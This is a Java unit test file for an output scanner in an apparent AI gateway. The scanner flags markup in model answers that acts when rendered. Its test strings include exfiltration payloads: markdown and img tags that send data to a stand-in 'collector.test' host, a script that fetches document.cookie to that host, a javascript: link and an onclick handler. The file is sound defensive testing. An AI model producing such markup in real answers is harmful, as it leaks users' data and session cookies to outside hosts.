package pl.aibron.aigate.inspection;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import static org.assertj.core.api.Assertions.assertThat;

@DisplayName("Output: markup that acts on its own when rendered (OWASP LLM05)")
class OutputSafetyTest {

    private final OutputSafety safety = new OutputSafety();

    @ParameterizedTest(name = "flagged: {0}")
    @ValueSource(strings = {
            "Summary done. ![x](https://collector.test/p?d=Q3VzdG9tZXIgZGF0YQ)",
            "<img src=\"https://collector.test/p?d=leak\" width=1>",
            "<script>fetch('https://collector.test/?c='+document.cookie)</script>",
            "<iframe src=\"https://collector.test\"></iframe>",
            "Click [here](javascript:alert(document.domain))",
            "<a href=\"#\" onclick=\"steal()\">details</a>"})
    void flagged(String answer) {
        assertThat(safety.scan(answer)).isNotEmpty();
    }

    @ParameterizedTest(name = "clean: {0}")
    @ValueSource(strings = {
            "The quarterly report is attached to the ticket.",
            "See [the PSD2 summary](https://eur-lex.europa.eu/eli/dir/2015/2366/oj) for details.",
            "![bank logo](https://cdn.bank.test/logo.png)",
            "An XSS payload looks like `<script>alert(1)</script>`; never render user input as HTML.",
            "```html\n<img src=\"https://x.test/a?b=c\" onerror=\"x()\">\n```"})
    void clean(String answer) {
        assertThat(safety.scan(answer)).isEmpty();
    }

    @Test
    @DisplayName("removing the finding leaves the rest of the answer intact")
    void removal() {
        var answer = "Done. ![x](https://collector.test/p?d=abc) Anything else?";

        assertThat(TextInspector.mask(answer, safety.scan(answer), f -> "")).isEqualTo("Done.  Anything else?");
    }
}
